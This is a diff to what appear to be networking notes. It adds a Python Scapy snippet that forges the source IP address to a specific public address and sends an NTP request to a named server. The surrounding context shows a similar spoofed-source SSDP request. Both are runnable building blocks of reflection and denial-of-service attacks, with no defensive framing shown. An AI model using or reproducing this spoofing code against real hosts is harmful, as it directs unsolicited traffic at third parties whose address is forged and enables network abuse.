@@ -37,3 +37,13 @@ payload = "M-SEARCH * HTTP/1.1\r\n" \ #It is a HTTP over UDP or HTTPU
 ssdpRequest = IP(src=spoofedIPsrc,dst="239.255.255.250") / UDP(sport=1900, dport= 1900) / payload
 sr1(ssdpRequest)
 ```
+
+## (Spoofed) NTP request
+```python
+from scapy.all import *
+spoofedIPsrc="130.89.14.206"
+aNTPserver="112.64.246.89"
+
+ntpRequest = IP(src=spoofedIPsrc,dst=aNTPserver) / UDP() /NTP(version=4)
+sr1(ntpRequest)
+```
